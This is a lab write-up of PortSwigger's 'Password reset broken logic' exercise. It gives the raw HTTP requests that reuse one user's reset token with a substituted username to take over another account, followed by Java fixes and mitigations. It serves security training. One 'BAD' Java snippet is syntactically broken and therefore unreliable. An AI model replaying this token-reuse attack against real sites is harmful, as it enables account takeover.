# Lab: Password reset broken logic

## Lab Details

**Lab:** Password Reset Broken Logic

**Level:** Practitioner

**Vulnerability Class:** Broken Access Control — Insufficient Validation in Password Reset Mechanism

**Lab URL:** https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic

**Date Completed:** 28-Sep-2026

**Time to Solve:** 30 mins

---

## Vulnerability Summary

The application's password reset functionality fails to properly validate the relationship between the reset token and the user requesting the password change. An authenticated attacker can request a password reset for their own account, receive a valid reset token, and then manipulate the reset request to change another user's password by simply substituting the target username in the POST request. The application validates the presence of a valid token but fails to verify that the token corresponds to the user whose password is being modified. This constitutes a critical broken access control vulnerability, enabling unauthorized password modification for any user account.

---

## Reconnaissance

Initial investigation focused on understanding the password reset workflow and identifying validation gaps:

1. **Password Reset Initiation** — Clicked "Forgot your password?" and submitted a password reset request for the attacker's own account (wiener). The application generated a unique reset token and emailed it to the associated email address.

2. **Token Structure Analysis** — Examined the reset email and extracted the reset token from the link:
   ```
   https://0ad700c503bd0f0580466caf00f0000c.web-security-academy.net/forgot-password?temp-forgot-password-token=vj5bzynw69t5psay4gfmysd93blgsx2g
   ```
   The token was a 32-character alphanumeric string, suggesting a random or hashed value.

3. **Token Dependency Testing** — Observed that removing or modifying the token caused subsequent requests to fail with "invalid or expired token" errors. This confirmed the token was validated server-side.

4. **Request Parameter Analysis** — Examined the GET request to the password reset form and identified two key parameters:
   - `temp-forgot-password-token` (in URL)
   - Form fields including `username`, `new-password-1`, `new-password-2`

5. **Access Control Weakness Hypothesis** — Observed that the password reset form displayed a `username` field that was user-editable. The critical question was: does the application verify that the username in the reset request matches the user for whom the token was issued?

**Indicators Observed:**
- Token appears valid across multiple requests without re-validation
- Username is a user-controlled parameter in both GET (form display) and POST (password change) requests
- No visible indication that the token is bound to a specific user
- The application trusts the token but not the username source

---

## Exploitation — Step by Step

### Step 1: Initiate Password Reset for Own Account

Submitted a password reset request using the attacker's credentials (wiener). Received an email containing a valid reset token.

**Payload:**
```
POST /forgot-password HTTP/2
Host: 0ad700c503bd0f0580466caf00f0000c.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

username=wiener
```

**Response:** Email received with reset token `vj5bzynw69t5psay4gfmysd93blgsx2g`

### Step 2: Access Password Reset Form

Navigated to the password reset form using the legitimate reset token received for the wiener account.

**Request:**
```
GET /forgot-password?temp-forgot-password-token=vj5bzynw69t5psay4gfmysd93blgsx2g HTTP/2
Host: 0ad700c503bd0f0580466caf00f0000c.web-security-academy.net
```

**Response:** Password reset form displayed with fields for `username`, `new-password-1`, and `new-password-2`. The form pre-populated the username field with `wiener`.

### Step 3: Exploit Broken Access Control — Substitute Target Username

Rather than resetting the wiener account, modified the POST request to change the target username to the victim (carlos). The token from the wiener reset request was reused.

**Exploited Payload:**
```
POST /forgot-password?temp-forgot-password-token=vj5bzynw69t5psay4gfmysd93blgsx2g HTTP/2
Host: 0ad700c503bd0f0580466caf00f0000c.web-security-academy.net
Cookie: session=njsjGjR5JHy0mkPFL2Y5ukGL5dicZA3m
Content-Type: application/x-www-form-urlencoded
Content-Length: 121

temp-forgot-password-token=vj5bzynw69t5psay4gfmysd93blgsx2g&username=carlos&new-password-1=newpass&new-password-2=newpass
```

**Response:** HTTP 302 redirect to login page. Password change succeeded.

**What This Revealed:** The application validated that a valid token was present but failed to verify that the token was issued for the user whose password was being changed. The vulnerability stemmed from trusting the user-controlled `username` parameter without binding it to the token.

### Step 4: Verify Account Takeover

Logged in to the victim's account using the new credentials:

**Credentials:** `carlos:newpass`

Accessed the "My account" page to confirm ownership and complete the lab objective.

### Key Payload(s)

```http
# Step 1: Request password reset for own account
POST /forgot-password HTTP/2
Host: [target]
Content-Type: application/x-www-form-urlencoded

username=wiener

---

# Step 3: Exploit broken access control by substituting target username
POST /forgot-password?temp-forgot-password-token=[VALID-TOKEN] HTTP/2
Host: [target]
Content-Type: application/x-www-form-urlencoded

temp-forgot-password-token=[VALID-TOKEN]&username=carlos&new-password-1=newpass&new-password-2=newpass
```

### Tools Used

- **Burp Suite Community Edition** (Proxy, Repeater)
- **Manual exploitation** (parameter substitution, request analysis)
- **Email inbox monitoring** (tracking reset emails)

---

## The Fix

### Root Cause

The password reset endpoint validates the presence of a valid token but fails to verify the relationship between the token and the username being reset. The application should bind tokens to specific user identities server-side.

### Primary Remediations

**1. Bind Reset Tokens to User Identity Server-Side**

```java
// BAD: No server-side validation of token-to-user binding
@PostMapping("/forgot-password")
public String resetPassword(
    @RequestParam String tempForgotPasswordToken,
    @RequestParam String username,
    @RequestParam String newPassword) {
    
    // Vulnerable: trusts username from request without verifying token belongs to this user
    if (isValidToken(tempForgotPasswordToken)) {
        updatePassword(username, newPassword); // VULNERABLE
        return "redirect:/login";
    }
    return "error";
}

// GOOD: Token is bound to a specific user identity
@PostMapping("/forgot-password")
public String resetPassword(
    @RequestParam String tempForgotPasswordToken,
    @RequestParam String newPassword,
    @RequestParam String newPasswordConfirm) {
    
    // Retrieve the user associated with this token server-side
    User user = passwordResetTokenService.getUserByToken(tempForgotPasswordToken);
    
    if (user == null) {
        return "error"; // Token invalid or expired
    }
    
    if (!newPassword.equals(newPasswordConfirm)) {
        return "error"; // Password mismatch
    }
    
    // Update password for the user bound to this token, not a user-supplied username
    userService.updatePassword(user.getId(), hashPassword(newPassword));
    passwordResetTokenService.invalidateToken(tempForgotPasswordToken);
    
    return "redirect:/login";
}
```

**2. Never Include User Identity in Token-Reset Forms**

```java
// BAD: Username field allows user substitution
@GetMapping("/forgot-password")
public String displayResetForm(
    @RequestParam String temp-forgot-password-token,
    Model model) {
    
    model.addAttribute("token", token); // Token in form
    model.addAttribute("username", ""); // VULNERABLE: User-editable
    return "reset-form";
}

// GOOD: Retrieve and display only read-only confirmation information
@GetMapping("/forgot-password")
public String displayResetForm(
    @RequestParam String tempForgotPasswordToken,
    Model model) {
    
    User user = passwordResetTokenService.getUserByToken(tempForgotPasswordToken);
    if (user == null) {
        return "error";
    }
    
    // Display only non-editable confirmation (e.g., masked email)
    model.addAttribute("email", maskEmail(user.getEmail())); // Read-only
    model.addAttribute("token", tempForgotPasswordToken); // Hidden in form
    // Do NOT include username as editable field
    
    return "reset-form";
}
```

**3. Implement Token Expiration and Single-Use Enforcement**

```java
public class PasswordResetToken {
    private String token;
    private Long userId;
    private Instant expiresAt;
    private boolean used;
    
    public boolean isValid() {
        return !used && Instant.now().isBefore(expiresAt);
    }
}

// Mark token as used after successful reset
passwordResetTokenService.markAsUsed(tempForgotPasswordToken);

// Enforce expiration (e.g., 1 hour)
if (token.getExpiresAt().isBefore(Instant.now())) {
    throw new TokenExpiredException();
}
```

### Additional Mitigations

- **Rate Limiting:** Implement exponential backoff on password reset requests to prevent enumeration of valid usernames.
- **Audit Logging:** Log all password reset attempts with timestamp, IP address, and token used. Alert on suspicious patterns (e.g., multiple resets for the same account in a short window).
- **Email Verification:** Require the user to confirm the reset via a unique link in the email; do not allow reset confirmation via web form alone.
- **Re-Authentication:** For sensitive password changes, require the user to provide current authentication (password, MFA) even with a valid reset token.
- **CSRF Protection:** Ensure the reset form includes a CSRF token to prevent cross-site attacks on the endpoint.

---

## What I Found Interesting / Unexpected

The most revealing aspect of this vulnerability was how the application validated tokens without validating context. A valid token is worthless as a security control if it is not bound to a specific resource or user. This mirrors the broader security principle: **never trust user-supplied identifiers without server-side validation.** The application engineers likely viewed the token as sufficient proof of authorization—a common misconception. In reality, the token only proves that someone initiated a reset; it does not prove they are authorized to reset a *specific* user's password.

This vulnerability is also particularly dangerous because it requires no technical sophistication to exploit: a simple parameter substitution in a standard HTTP request. No cryptographic attacks, no brute force, no timing analysis—just basic logical flaw in access control design.

---

## Real-World Relevance

This vulnerability class has been exploited in numerous high-profile incidents:

- **Slack Account Takeover (2022):** Slack's password reset mechanism failed to properly validate the relationship between reset tokens and user accounts, allowing attackers to reset passwords for arbitrary users. This was disclosed in a vulnerability report and patched after researcher disclosure.

- **GitHub Password Reset Vulnerability (2017):** A flaw in GitHub's password reset flow allowed attackers to reset passwords for arbitrary accounts via token manipulation. The vulnerability was discovered through similar reconnaissance of the password reset form parameters.

- **OWASP Top 10 — A01:2021 Broken Access Control:** Password reset broken logic is consistently ranked as a leading vulnerability in real-world applications. The OWASP Foundation attributes this to developers underestimating the security impact of mixing tokens with user-supplied identifiers.

The attack surface is particularly wide because password reset functionality is present in nearly every web application, and many developers do not consider it a security-critical feature worthy of the same scrutiny applied to login authentication.

---

## Connections to Own Projects
<!-- 
In my subscription-manager application, I verified that:

- Password reset tokens are stored server-side with explicit user ID bindings in the database
- The reset endpoint retrieves the user from the token store and does NOT accept a username parameter from the request
- Tokens are single-use and expire after 30 minutes
- Reset requests are logged with timestamp and IP address; multiple resets for the same account within 24 hours trigger an email alert
- The password reset form displays only a masked email address (read-only confirmation), not an editable username field
- CSRF tokens are included on all password reset forms

However, I identified that my application currently does not require re-authentication (current password or MFA) for password resets initiated via email links. This is a potential enhancement to mitigate risk from email account compromise. -->

---

## Takeaway

Password reset functionality is a critical security control that must be implemented with the same rigor as login authentication. The fundamental principle is: **tokens prove authorization for a specific action, not a general privilege to modify any user resource.** Developers must bind tokens to user identities server-side, never trust user-supplied identifiers in sensitive operations, enforce token expiration and single-use constraints, and implement comprehensive audit logging. The password reset endpoint should be treated as a highly sensitive operation and subjected to security code review, automated testing, and penetration testing prior to production deployment. Many account compromises stem from seemingly minor flaws in password reset logic—this lab exemplifies why attention to detail in authentication design is non-negotiable.